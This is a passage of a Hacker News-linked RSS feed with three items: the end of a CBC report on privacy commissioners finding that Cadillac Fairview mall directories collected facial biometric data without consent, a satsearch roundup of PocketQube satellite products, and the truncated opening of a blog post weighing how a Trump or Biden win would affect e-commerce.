meaningful consent was particularly concerning given the sensitivity of biometric data, which is a unique and permanent characteristic of our body and a key to our identity."</p>  <p>According to the report, the technology&nbsp;Cadillac Fairview used&nbsp;‚Äî known as "anonymous video analytics" or AVA‚Äî took temporary digital images of the faces of individuals within the field of view of the camera in the directory.</p>  <p><strong><em>WATCH: Shoppers' privacy violated at major Canadian malls: Privacy commissioners:</em></strong></p>  <p><span><span><div><div role="button" tabindex="0" title="Shoppers‚Äô privacy violated at major Canadian malls: Privacy commissioners"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/949/527/mall-privacy-daigle-291020.jpg" alt=""></p></div></div></div><span>Cadillac Fairview, the real estate company behind some of Canada‚Äôs biggest malls, violated the privacy of shoppers by collecting five million images without consent from cameras inside digital information kiosks, an investigation by federal, British Columbia and Alberta privacy commissioners found.<!-- --> <!-- -->2:01</span></span></span></p>  <p>It then used facial recognition software to convert those images into biometric numerical representations of&nbsp;individual faces, about five million images&nbsp;in total.</p>  <p>That sensitive personal information could be used to identify individuals based on their unique facial features, said&nbsp;the commissioners.</p>    <p>The report said the company also kept about 16 hours of video recordings, including some audio, which it had captured during a testing phase at two malls.</p>  <p>Cadillac Fairview said it&nbsp;used AVA technology&nbsp;to assess foot traffic and track shoppers' ages and genders&nbsp;‚Äî but not to identify individuals.&nbsp;</p>  <p>The company also argued shoppers were made aware of the activity through decals it placed on shopping mall entry doors that warned cameras were being used for "safety and security" and included the web address for Cadillac Fairview's&nbsp;privacy policy.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/chinook-centre-directory.jpg 300w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/chinook-centre-directory.jpg 460w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/chinook-centre-directory.jpg 620w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/chinook-centre-directory.jpg 780w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/chinook-centre-directory.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/chinook-centre-directory.jpg"></p></div><figcaption>This directory in Chinook Centre mall in south Calgary uses facial recognition technology.<!-- --> <!-- -->(Sarah Rieger/CBC)</figcaption></figure></span></p>  <p>But the commissioners said that&nbsp;wasn't good enough and did not meet the standard for meaningful consent.&nbsp;</p>  <p>"An individual would not, while using a mall directory, reasonably expect their image to be captured and used to create a biometric representation of their face, which is sensitive personal information, or for that biometric information to be used to guess their approximate age and gender," they wrote.</p>  <p>The privacy watchdogs also took issue with the way the&nbsp;five&nbsp;million images were stored.</p>  <p>Cadillac Fairview&nbsp;said the&nbsp;images taken by camera were briefly analyzed then deleted&nbsp;‚Äî&nbsp;but investigators found that the sensitive biometric information generated from the images was being stored in a centralized database by&nbsp;a third-party company,</p>  <p>"Our investigation revealed that&nbsp;[Cadillac Fairview Corporation Limited's]&nbsp;AVA&nbsp;service provider had collected and stored approximately five million numerical representations of faces on&nbsp;CFCL's behalf, on a decommissioned server, for no apparent purpose and with no justification," notes the investigation.</p>  <p>"Cadillac Fairview stated that it was unaware that the database of biometric information existed, which compounded the risk of potential use by unauthorized parties or, in the case of a data breach, by malicious actors."</p>  <h2>Company&nbsp;says technology couldn't identify people</h2>  <p>The company said the technology was used&nbsp;to detect the presence of a human face and&nbsp;assign it&nbsp;"within milliseconds"&nbsp;to an approximate age and gender category and maintains it&nbsp;did not store any images during the pilot program and was not capable of recognizing anyone.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/eaton-centre-decal.jpg 300w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/eaton-centre-decal.jpg 460w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/eaton-centre-decal.jpg 620w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/eaton-centre-decal.jpg 780w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/eaton-centre-decal.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/eaton-centre-decal.jpg"></p></div><figcaption>The decal found on the entrance doors of the CF Toronto Eaton Centre<!-- --> <!-- -->(Office of the Privacy Commissioner report)</figcaption></figure></span></p>  <p>"The five million representations referenced in the [Office of the Privacy Commissioner]&nbsp;report are not faces. These are sequences of numbers the software uses to anonymously categorize the age range and gender of shoppers in the camera's view," Cadillac Fairview spokesperson Jess Savage&nbsp;said in a statement to CBC News.</p>  <p>"The&nbsp;OPC report concludes there is no evidence that CF was using any technology for the purpose of identifying individuals."</p>  <p>CF&nbsp;suspended its&nbsp;use of cameras&nbsp;back in 2018&nbsp;when provincial and federal privacy commissioners launched their probe&nbsp;<a href="https://www.cbc.ca/news/canada/calgary/calgary-malls-1.4760964">following a CBC investigation</a>.</p>  <p>In a statement to CBC News on Thursday, the company said it has deleted the data.</p>  <p>"We subsequently deactivated directory cameras and the numerical representations and associated data have since been deleted," said&nbsp;Savage.</p>  <p>"We take the concerns of our visitors seriously and wanted to ensure they were acknowledged and addressed."</p>  <p>However, the three commissioners said they have concerns about the company's plans going forward.</p>    <p>"The commissioners remain concerned that Cadillac Fairview refused their request that it commit to ensuring express, meaningful consent is obtained from shoppers should it choose to redeploy the technology in the future," said&nbsp;the commissioners'&nbsp;statement.</p>  <h2>No fines under Canadian law</h2>  <p>Savage said Cadillac Fairview&nbsp;accepted and implemented all the recommendations&nbsp;"with the exception of those that speculate about hypothetical future uses of similar technology."</p>  <p>The investigation found the technology was used&nbsp;in five provinces&nbsp;at the following malls:</p>  <ul>   <li>CF Market Mall (Calgary)</li>   <li>CF Chinook Centre (Calgary)</li>   <li>CF Richmond Centre (Richmond, B.C.)</li>   <li>CF Pacific Centre (Vancouver)</li>   <li>CF Polo Park (Winnipeg)</li>   <li>CF Toronto Eaton Centre (Toronto)</li>   <li>CF Sherway Gardens (Toronto)</li>   <li>CF Fairview Mall (Toronto)</li>   <li>CF Lime Ridge (Hamilton, Ont.)</li>   <li>CF Markville Mall (Markham, Ont.)</li>   <li>CF Galeries d'Anjou&nbsp;(Montreal)</li>   <li>CF Carrefour Laval (Laval, Que.)</li>  </ul>  <p>Ann Cavoukian,&nbsp;executive director at the Global Privacy and Security by Design Centre,&nbsp;said a case like this would lead to millions of dollars in fines if it had happened&nbsp;in the United States.</p>  <p>"The commissioners are doing the best they can with the limited resources they have," she said.</p>  <p>"What we have to insist upon is that private&nbsp;sector entities like Cadillac Fairview step up and protect their customers' privacy. Otherwise, why are the customers going to continue shopping there?"</p>  <p>B.C. Information and Privacy Commissioner&nbsp;Michael McEvoy&nbsp;said&nbsp;the fact he and his counterparts can't issue a fine in a&nbsp;case like this should make the case for stronger powers at both the federal and provincial levels.</p>  <p>"Fines in a case like this would have been a consideration. It is an incredible shortcoming of Canadian law," he said.</p>  <p>"We as privacy regulators don't have any authority to levy fines on companies that violate peoples'&nbsp;personal information and that should really change."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/politics/cadillac-fairview-5-million-images-1.5781735?cmp=rss</link>
            <guid isPermaLink="false">hacker-news-small-sites-24933583</guid>
            <pubDate>Thu, 29 Oct 2020 18:22:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A guide to PocketQubes (tiny satellites)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24933262">thread link</a>) | @kartikkumar
<br/>
October 29, 2020 | https://blog.satsearch.co/2020-10-28-pocketqube-satellites-and-ancillary-products-on-the-global-marketplace | <a href="https://web.archive.org/web/*/https://blog.satsearch.co/2020-10-28-pocketqube-satellites-and-ancillary-products-on-the-global-marketplace">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p><em>This is a market segment roundup initially developed in collaboration with <a href="https://satsearch.co/suppliers/alba-orbital" title="alba orbital on satsearch" target="_blank">Alba Orbital</a> and focussing on companies that offer products and services in the PocketQube picosatellite form factor.</em></p>



<p>Electronic and structural miniaturisation of space components and sub-systems has led to a variety of innovations in recent years.</p>

<p>A wide range of parts and components have been manufactured with increasingly smaller physical footprints, and this has reduced the overall size of complete systems.</p>

<p>The costs and lead times of such systems have also decreased, while the range of possible in-orbit applications and technology available has grown. This has been driven by greater use of commercial-of-the-shelf (COTS) components and the commercial availability of a wider range of products, parts and materials with flight heritage.</p>

<p>In addition, the growth in both research and commercial interest in space applications, along with an increase in new entrants and innovation to the market, has led to greater demand for more compatible, interoperable, and modular products.</p>

<p>Over the years this has led to the emergence of standardised physical form factor satellites such as CubeSats and PocketQubes.</p>

<p><a href="https://satsearch.co/suppliers/alba-orbital" target="_blank"><img src="https://raw.githubusercontent.com/satsearch/satsearch-blog/master/assets/201028_satsearch_alba_orbital_unicorn_1.png" alt="alba orbital on satsearch"></a>
  </p>
<p><em>The Unicorn-1 satellite designed by <a href="https://satsearch.co/suppliers/alba-orbital" title="alba orbital on satsearch" target="_blank">Alba Orbital</a> - for the European Space Agency‚Äôs first PocketQube mission (<a href="http://www.albaorbital.com/unicorn-1" title="alba orbital unicorn-1 mission" target="_blank">credit</a>).</em></p>



<p>PocketQubes are very small satellites that are often used for research purposes. They were <a href="https://en.wikipedia.org/wiki/PocketQube" title="pocketqubes on wikipedia" target="_blank">first developed</a> based on work at Morehead State University (MSU) and Kentucky Space, USA, in 2009. They were originally called PocketQubs.</p>

<p>A PocketQube is a 5cm cube and typically has a launch mass of no more than 250g.</p>

<p>In small satellite form factor terminology a 5 x 5 x 5 cm<sup>3</sup> cube is also known as <strong>1p</strong> and PocketQube satellites are products that are usually organised by size according to the number of p they feature ‚Äì in the same way that U is used for CubeSats.</p>

<p>In this post we take a look at a variety of PocketQube products, systems, and suppliers around the world offering hardware and services for this segment of the market.</p>



<h2 id="pocketqube-products-on-the-global-marketplace">PocketQube products on the global marketplace</h2>

<p>In the section below you can see a variety of products and services related to PocketQubes that are available on the market.</p>

<p>These listings will be updated when new PocketQube products are added to the global marketplace for space at <a href="https://satsearch.co/" title="the global marketplace for space" target="_blank">satsearch.co</a> - so please check back for more or <a href="https://satsearch.us10.list-manage.com/subscribe/post?u=c80ec0b3e92164736b768fa12&amp;id=862b97e1e0">sign up for our mailing list</a> for all the updates.</p>

<p><strong>You can click on any of the links or images below to find out more about the systems. If you‚Äôd like more detail please submit a request for a quote, documentation, introduction, or further information on each of the products listed or <a href="https://satsearch.co/request" title="space procurement on the global marketplace for space" target="_blank">send us a more general query to discuss your specific needs</a>), and we will use our global networks of suppliers to find a system to meet your specifications.</strong></p>



<h3 id="the-1d-mgse-for-pocketqubes-by-murb-space">The <a href="https://satsearch.co/products/murbspace-1d-mgse-for-pocket-qubes" title="1d mgse for pocketqubes by murb space on satsearch" target="_blank">1D MGSE for PocketQubes</a> by <a href="https://satsearch.co/suppliers/murbspace" title="murb space on satsearch" target="_blank">MURB Space</a></h3>

<p><a href="https://satsearch.co/products/murbspace-1d-mgse-for-pocket-qubes" target="_blank"><img src="https://satsearch.s3.eu-central-1.amazonaws.com/product-images/satsearch_n0d5mo_murb_space_1d_mgse.png" alt="1D MGSE for PocketQubes on satsearch"></a>
</p>

<p><a href="https://satsearch.co/membership" target="_blank"><img src="https://blog.satsearch.co/assets/satsearch_member_badge.png" alt="Satsearch member" width="100"></a>

</p>



<p>MURB Space develops engineering solutions for small satellite integrators designed to improve assembly, integration and testing (AIT) processes. The 1D Mechanical and Ground Support Equipment (1D MGSE) was created to facilitate and shorten AIT processes for PocketQube satellite development, while ensuring that hardware can still satisfy the strict quality requirements expected in the space industry.</p>

<p>Manual AIT activities have to be carried out with care, consuming significant time and resources for reporting and safety procedures. The 1D MGSE is a dedicated tool for AIT processes that can help reduce the number of steps, the effort, and the resources needed during picosatellite development as well as cut down on errors, by significantly reducing the number of manual tasks.</p>



<h3 id="pocketqube-satellites-sub-systems-and-services-by-alba-orbital-ltd">PocketQube satellites, sub-systems and services by <a href="https://satsearch.co/suppliers/alba-orbital" title="alba orbital on satsearch" target="_blank">Alba Orbital Ltd.</a></h3>

<p><a href="https://satsearch.co/products/alba-orbital-pocket-qube-deployer-albapod" target="_blank"><img src="https://satsearch.s3.eu-central-1.amazonaws.com/product-images/satsearch_product-image_snura2_alba_orbital_pocket_qube_deployer_albapod.jpg" alt="alba orbital albapod on satsearch"></a>
   <a href="https://satsearch.co/products/alba-orbital-pocketqube-1p-structure" target="_blank"><img src="https://satsearch.s3.eu-central-1.amazonaws.com/product-images/satsearch_ma1jbw_alba_orbital_pocketqube_1p_structure.jpg" alt="alba orbital Pocketqube 1P Structure on satsearch"></a>
   <a href="https://satsearch.co/services/alba-orbital-pocket-qube-launch" target="_blank"><img src="https://satsearch.s3.eu-central-1.amazonaws.com/product-images/satsearch_product-image_qr6vfk_alba_orbital_pocket_qube_launch.JPG" alt="alba orbital pocketqube launch on satsearch"></a>
</p>



<p>Alba Orbital provides a range of modular PocketQube platforms, ground station solutions, launch services, payloads, consultancy services, and other products.</p>

<p>The <a href="https://satsearch.co/products/alba-orbital-pocketqube-1p-structure" title="Pocketqube 1P Structure by alba orbital on satsearch" target="_blank">Pocketqube 1P Structure</a> is a 50 x 50 x 50 mm<sup>3</sup> satellite chassis with a skeletonized wall structure. It weighs 0.069 kg and has an operating temperature range of 223‚Äî363 K.</p>

<p>Alba Orbital‚Äôs <a href="https://satsearch.co/products/alba-orbital-pocket-qube-deployer-albapod" title="PocketQube Deployer Albapod on satsearch" target="_blank">PocketQube Deployer Albapod</a> enables the deployment of one or multiple PocketQubes into orbit. It is suitable for 1p, 1.5p, 2p or 3p PocketQube format satellites and has a 10mm envelope for larger deployables and antennas. It is compatible with MR-FOD style PocketQubes and features tabbed systems designed to reduce contact points from 4 to 2 in order to minimise risk. The Albapod can be integrated onto any launch vehicle and there is also a 96p variant available for PocketQube constellation deployment.</p>

<p>Alba Orbital‚Äôs <a href="https://satsearch.co/services/alba-orbital-pocket-qube-launch" title="alba orbital pocketqube launch service on satsearch" target="_blank">launch service</a> has been developed to offer regular, reliable and cost-effective launch opportunities to companies, universities and other PocketQube teams. Alba Orbital has developed partnerships with a variety of launch companies and brokers and utilises the AlbaPod Deployer (detailed above) as part of the launch service.</p>

<p>At the time of writing Alba Orbital has launched more PocketQube satellites into orbit than any other organisation</p>



<h3 id="pocketqube-structures-by-gauss">PocketQube structures by <a href="https://satsearch.co/suppliers/gauss" title="GAUSS pocketqube structures on satsearch" target="_blank">G.A.U.S.S.</a></h3>

<p><a href="https://satsearch.co/suppliers/gauss/products" target="_blank"><img src="https://satsearch.s3.eu-central-1.amazonaws.com/product-images/satsearch_c09khq_gauss_srl_1u_cubesat.png" alt="GAUSS PocketQube products on satsearch"></a>
</p>



<p>G.A.U.S.S. manufactures a range of PocketQube size structure products for various satellite form factors. Alongside the hardware provided G.A.U.S.S. also offers support for design and FEM analysis for both standard and customized structures according to the client‚Äôs needs.</p>

<p>Solutions are available for a variety of cases including; deployable systems, interfaces for structural tests and IOD/IOV platforms. The individual PocketQube products are:</p>

<ul>
  <li><strong><a href="https://satsearch.co/products/gauss-1.5p-pocketqube" title="1p pocketqube on satsearch" target="_blank">1p PocketQube</a></strong></li>
  <li><strong><a href="https://satsearch.co/products/gauss-1.5p-pocketqube" title="1.5p pocketqube on satsearch" target="_blank">1.5p PocketQube</a></strong></li>
  <li><strong><a href="https://satsearch.co/products/gauss-2p-pocketqube" title="2p pocketqube on satsearch" target="_blank">2p PocketQube</a></strong></li>
  <li><strong><a href="https://satsearch.co/products/gauss-3p-pocketqube" title="3p pocketqube on satsearch" target="_blank">3p PocketQube</a></strong></li>
</ul>



<h3 id="the-pocketqube-solar-panel-by-dhv-technology">The <a href="https://satsearch.co/products/dhv-technology-pocketqube-solar-panel" title="dhv technology Pocketqube Solar Panel on satsearch" target="_blank">Pocketqube Solar Panel</a> by <a href="https://satsearch.co/suppliers/dhv-technology" title="dhv technology on satsearch" target="_blank">DHV Technology</a></h3>

<p><a href="https://satsearch.co/products/dhv-technology-pocketqube-solar-panel" target="_blank"><img src="https://satsearch.s3.eu-central-1.amazonaws.com/product-images/satsearch_ioqji9_dhv_technology_pocketqube_solar_panel.png" alt="Pocketqube Solar Panel on satsearch"></a>
</p>



<p>The DHV Technology Pocketqube Solar Panel has been developed to bring solar power to picosatellites. It features Spectrolab TASJ solar cells and is available in 1p, 2p and 3p formats as well as customized sizes. It is manufactured from PCB low thickness polyimide substrate and features the following electrical parameters, under the conditions 1 sun, AM 1.5G (1000 W/m<sup>2</sup>) 25¬∞C:</p>

<ul>
  <li>I<sub>SC</sub> = 31 mA</li>
  <li>I<sub>mp</sub> = 28 mA</li>
  <li>V<sub>OC</sub> = 15.12 V</li>
  <li>V<sub>mp</sub> = 13.14 V</li>
  <li>P<sub>mp</sub> = 368 mW</li>
</ul>



<h3 id="pocketqube-development-services-by-fossa-systems">PocketQube development services by <a href="https://satsearch.co/suppliers/fossa" title="fossa systems on satsearch" target="_blank">Fossa Systems</a></h3>

<p><a href="https://satsearch.co/suppliers/fossa" target="_blank"><img src="https://satsearch.s3.eu-central-1.amazonaws.com/supplier-images/logo_2nqap3_fossa.png" alt="Pocketqube development services by Fossa Systems on satsearch"></a>
</p>



<p>Fossa Systems provides a range of development services for picosatellite manufacturers and operators for Low Earth Orbit (LEO) applications, with a focus on integrated and high-performance PocketQube platforms. FOSSA Systems acquired flight heritage in 2019 in missions such as FOSSASAT-1 which demonstrated a LoRa IOT telecommunications satellite sized at 5cm and weighing under 250g.</p>

<p>The company offers integrated PocketQube hardware solutions, sub-system level PocketQube components, consulting and launch services and is also developing a range of cutting-edge equipment including ADCS systems, PocketQube propulsion systems and EO payloads for picosatellites.</p>



<p><strong><em>Thanks for reading! If you would like further help identifying a PocketQube or picosatellite product or service for your needs, <a href="https://satsearch.co/request">please click here to send us a query</a> and we‚Äôll use our extended global networks of suppliers to find the information you need.</em></strong></p>

<p><strong><em>Have you noticed that your company isn‚Äôt included in this article? <a href="https://blog.satsearch.co/cdn-cgi/l/email-protection#9ef7f0f8f1deedffeaedfbffecfdf6b0fdf1">Simply send us an email today</a>, and we‚Äôd be happy to work with you to showcase your products to the satsearch community!</em></strong></p>

    </div></div>]]>
            </description>
            <link>https://blog.satsearch.co/2020-10-28-pocketqube-satellites-and-ancillary-products-on-the-global-marketplace</link>
            <guid isPermaLink="false">hacker-news-small-sites-24933262</guid>
            <pubDate>Thu, 29 Oct 2020 18:03:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Trump vs. Biden. Whose side is ecommerce on?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24933119">thread link</a>) | @Elons_baby
<br/>
October 29, 2020 | https://grinteq.com/blog/trump-vs-biden-whose-side-is-ecommerce-on | <a href="https://web.archive.org/web/*/https://grinteq.com/blog/trump-vs-biden-whose-side-is-ecommerce-on">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><img src="https://mc.yandex.ru/watch/50400562" alt=""></p>
    
    <!-- /Yandex.Metrika counter -->
    <meta name="google-site-verification" content="gQ3ei9ukMGhD1QJgdTqR12Tn7iPtswqPconmlhUgyKI">
    <!-- Global site tag (gtag.js) - Google Analytics -->
    
    



<!-- Google Tag Manager (noscript) -->

<!-- End Google Tag Manager (noscript) -->



<div>
    <div>
        <div>
            <p>Trump vs Biden. Whose Side is E-commerce On?</p>
            <p>Let the battle begin!</p>
        </div>
        
        <div>
            <p><img src="https://grinteq.com/assets/design/Blog_images/0.jpg"></p>
        </div>
        
        <p>Less than a week left before the Americans elect the new President. It‚Äôs difficult to predict which way the votes will go, but the one thing we can confidently claim‚Äîe-commerce space won‚Äôt be the same. We do not pretend to be political experts, but in this article, we‚Äôll examine how the e-commerce business could change or be affected in either scenario. Let the battle begin!</p>
    </div>
</div>

<section>
    
    <div>
        <div>
            <div>
    <p>Known Present vs Unknown Future</p>
    
    <p><img src="https://media.giphy.com/media/3o6QLoYiFxEgHrYyxa/source.gif"></p>
    
    <div>
        <div><p>Okaaay‚Ä¶ To start with, let‚Äôs mention that this battle can‚Äôt be fair.&nbsp;</p><p>

<strong>Why so?</strong> We have been witnessing Trump‚Äôs politics for 4 years already, and after analyzing its main results, we can build some hypotheses for the next few years. As for the win of the Democratic Party, we can just rely on Biden‚Äôs presidential campaign and believe that all the promises will come true <em>*coughs twice*</em>.</p><p>

Unfortunately, we won‚Äôt hear the direct overview of the e-commerce future from both sides, but this industry is highly affected by factors such as taxation, trade policy, foreign relations, laws, and capital flow.</p><p>

So, let‚Äôs start our little analysis.</p></div>

    </div>
</div><div>
    <p>Round 1. Taxation</p>
    
    <p><img src="https://media.giphy.com/media/rA4UF5rHBZHt6/giphy.gif"></p>
    
    <div>
        

<ul>
	<li><strong>Red corner</strong></li>
</ul>



<div><p><strong>What‚Äôs done.</strong> In their pre-pandemic budget proposal, the Trump administration promised to extend the massive <a href="https://www.investopedia.com/taxes/trumps-tax-reform-plan-explained/" target="_blank"><strong>Tax Cuts and Jobs Acts</strong></a>, which was signed in 2017 and had become the largest overhaul made in the last 30 years in tax code.</p><p>

<strong>For people...</strong>the law saved the previous structure of seven individual income tax brackets, but the majority of rates were lowered. The maximum rate for income over $500,000 has fallen by up to 37% from 39,6%. The lowest rate remained at 10%.&nbsp;</p><p>

<strong>For business...</strong>Trump created a single corporate tax rate of 21% and canceled the corporate alternative minimum tax.</p><p>

In combination with local and state taxes, the new statutory rate is now equal to 26.5% (the average weighted of EU countries - 26.9%).</p><p>

<strong>What to expect?</strong> Those who support the idea of low corporate tax rates believe that due to such measures companies won't look for more attractive business conditions abroad and the amount of M&amp;A international deals will decrease.</p></div>

<ul>
	<li><strong>Blue corner</strong></li>
</ul>



<div><p><strong>What‚Äôs the plan?</strong> In their <a href="https://www.investopedia.com/comparing-the-economic-plans-of-trump-and-biden-4843240" target="_blank">10-year released plan</a>, the Democrats suggested rolling back the corporate tax cuts, reducing incentives for tax havens, evasion, and outsourcing, and closing any loopholes in the tax code that encourage wealth, not work.</p><p>

As Democrats traditionally bet on corporate income taxes, Biden is planning to raise its rate to 28% from the current 21%.&nbsp;</p><p>

He wants to apply Social Security taxes to income above $400,000 and levy at least a 15% tax on book income of large corporations.&nbsp;</p><p>

<strong>As for business...</strong>no company "should absolutely be in a position where they pay no tax and make billions and billions and billions of dollars," <strong>Biden said</strong>. So, Amazon-like companies will have to contribute more funds to the country budget, IF the law is signed. <em>Poor Jeff.</em></p><p>

For those, whose annual income is higher than $1 million, it's supposed to gain tax capital and dividends at regular rates.</p><p>


<strong>What about e-commerce?</strong></p><p>

<strong>Personal taxes.</strong> If Trump wins, he will likely extend the 2017 tax overhaul for individuals. As for Biden, in case of victory, he will roll back tax cuts.&nbsp;</p><p>

Good cop/bad cop.</p><p>

Due to lower personal taxes, the spendable income is growing, as well as the purchasing power of buyers, and individuals start to spend more money, including shopping online. A point for Trump here.</p><p>

<strong>Corporate taxes.</strong> Lower corporate taxes that Trump suggests are clearly more favorable for e-commerce. It means companies will have much more resources to invest in business processes and innovation, which would lead to increased productivity and more sales in the end.</p><p>

If Biden is elected, his tax policy may have a negative impact on the whole business sphere, including e-commerce, forcing companies to search for more favorable tax rates and structures, and register their headquarters abroad.</p><p>

If this hypothesis actually turned out true, and a large part of companies were to relocate, it would carry a significant blow to the U.S. economy, multiplied by the COVID pandemic.</p><p>

<strong>Amazon time.</strong> Both candidates claim their willingness to fight Amazon, which shared <strong><a href="https://techcrunch.com/2018/07/13/amazons-share-of-the-us-e-commerce-market-is-now-49-or-5-of-all-retail-spend/" target="_blank">49% of the US e-commerce market</a></strong> ($256,7 billion) or 5% of all retail spend in 2018.</p><p>

Amazon pays taxes at <a href="https://www.investopedia.com/insights/amazon-effect-us-economy/#citation-3" target="_blank"><strong>an average rate of 13%</strong></a> ($33,3 billion), nearly half of the average rate companies from the S&amp;P 500 pay. Other big corporations like Facebook, Alphabet, and Apple also pay taxes at a rate significantly lower than the average.</p><p>

<strong>Good news for mid-sized companies.</strong> If the corporate tax rate was to increase for large enterprise and tech giants, their rapid expansion would slow down, giving the chances for smaller retailers to get a larger market share.</p></div>

    </div>
</div><div>
    <p>Round 2. Human Capital and Labour Productivity</p>
    
    <p><img src="https://media.giphy.com/media/3o6QL2hWeeBHlcZ8qs/source.gif"></p>
    
    <div>
        <ul>
	<li><strong>Red corner</strong></li>
</ul>



<div><p>As any other President, Donald Trump dreamt about a low unemployment rate and the creation of thousands of new jobs for American citizens. To complete the goal, his administration developed a range of stimulating measures.&nbsp;</p><p>

At least...they tried.</p><p>

<strong>Trump‚Äôs anti-record. </strong>Due to trade tariffs, hundreds of new jobs <a href="https://www.brookings.edu/policy2020/votervital/did-trumps-tariffs-benefit-american-workers-and-national-security/" target="_blank"><strong>appeared</strong></a><strong> </strong>in import-competing industries. But in general, tariffs benefited some workers at the expense of others.</p><p>

The Covid-19 was another factor that contributed to Trump's ‚Äòrecord‚Äô when the number of job losses became the worst of any American president. Sad story, but to be fair, other presidents never faced anything as pervasive as COVID-19.</p><p>

<strong>Against automation.</strong> Trump argues against increased automation and wants to protect American workers from being displaced by machines.&nbsp;</p><p>

Automation is the fuel of e-commerce and a perfect way to save time, effort, money, and keep a social distance.&nbsp;</p><p>

Cute Amazon robots bringing your groceries right to your door...</p><p>

Magical drones flying supplies through your window...&nbsp;</p><p>

Won‚Äôt we see them? Nooooo :(</p><p>

<strong>Banned visas.</strong> Instead of investing in technology development, Trump has banned worker visas. Such a step will definitely have a negative impact not only on Silicon Valley, where nearly <a href="https://www.mercurynews.com/2018/01/17/h-1b-foreign-citizens-make-up-nearly-three-quarters-of-silicon-valley-tech-workforce-report-says/" target="_blank"><strong>three-quarters of techies</strong></a> are foreign but also on the whole tech sector, including e-commerce.</p><p>

Yes, e-commerce businesses may easily and successfully transition to remote, but this process will take some period of time.</p></div>

<ul>
	<li><strong>Blue corner</strong></li>
</ul>



<div><p><strong>In contrast to Trump...</strong>Biden respects immigrants and understands the value of attracting global talent to the country.</p><p>

He suggests updating the immigration policy and rethinking the response to the Covid-19 consequences.&nbsp;</p><p>

<strong>Against outsourcing.</strong> In addition to the 28% corporate tax, Biden <strong><a href="https://joebiden.com/wp-content/uploads/2020/09/Buy-America-fact-sheet.pdf" target="_blank">promises</a></strong> a 10% Offshoring Penalty surtax, on profits of any production by a US company overseas for sales back to the US.&nbsp;</p><p>

Totally, companies would have paid a <strong>30.8% tax rate</strong> on any such profits.</p><p>

Such rules will force companies to use offshore resources illegally or to hire only local specialists with higher rates. Again, this added value will be included in the final price of the goods.</p><p>

Seems that inflation will become a new President of America‚Ä¶</p><p>

Biden will also cancel all deductions and expenses write-offs for moving jobs or production overseas, instead, offering these jobs to American workers.</p><p>


<strong>What does it mean for e-commerce?</strong></p><p>

<strong>Fewer immigrants - more outsourcing.</strong> An average web store creates way fewer jobs than a physical store. <em>(thanks to automation and cunning)</em></p><p>

For instance, Amazon has a team of 1 mln. people worldwide.&nbsp;</p><p>

Sounds impressive.&nbsp;</p><p>

Until the moment you find out that Walmart <a href="https://corporate.walmart.com/newsroom/company-facts#:~:text=Walmart%20employs%20more%20than%202.2,million%20in%20the%20U.S.%20alone." target="_blank"><strong>employs</strong></a> more than 2.2 million associates around the world ‚Äî nearly 1.5 million in the U.S. alone.&nbsp;</p><p>

Very often, you don‚Äôt even need to rent a big office to hire the team.&nbsp;</p><p>

<strong>Thanks to globalization and digitalization...</strong>it‚Äôs now easier to find a skilled specialist overseas than inside the country where the competition for talents is much higher.&nbsp;</p><p>

Immigration has contributed immensely to America‚Äôs economic success, making it a global leader in tech.&nbsp;</p><p>

Trump‚Äôs banning of worker visas has made many tech companies think about opening offices in Canada and other countries that allow immigration or increase hiring of distributed teams.&nbsp;</p><p>

<strong>Hiring remote teams</strong> and agencies is a solution that may become even more popular than it is. Imagine that you get access to a pool of talent from all over the world and can choose the best of them. Software development is one of the industries that widely use outsourcing because of the complexity and diversity of skills needed for each project.</p><p>

<a href="https://grinteq.com/e-commerce?utm_source=blog&amp;utm_medium=article&amp;utm_campaign=elections" target="_blank"><strong>See how you can get an awesome e-commerce customer experience &gt;&gt;&gt;</strong></a></p><p>

Biden is against outsourcing, Trump is against immigrant workers.&nbsp;</p><p>

And we should make this choice.</p><p>

<strong>The new reality.</strong> Perhaps, the only positive moment of the Covid-19 spread is the fact that companies realized that our world won‚Äôt be the same anymore. Remote work, outsourcing services, staff optimization, and automation are the keys to this new working reality.&nbsp;</p><p>

Although many people, including Trump, argue against the automatization of business, we can't imagine the new world without it.&nbsp;We already see the examples of partially (like Amazon Go) and fully automated shops (like ‚Äòdark stores‚Äô by The Whole Foods).&nbsp;</p><p>

And that is the future.</p><p>

